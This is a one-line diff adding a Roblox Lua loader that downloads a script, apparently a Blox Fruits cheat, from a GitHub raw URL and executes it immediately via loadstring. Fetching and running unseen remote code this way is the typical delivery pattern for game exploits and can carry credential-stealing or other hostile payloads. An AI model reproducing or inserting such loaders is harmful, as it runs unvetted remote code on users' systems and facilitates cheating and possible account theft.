@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/blox-fruits-spam0-d6a6ys6lkw8hhq.lua"))()
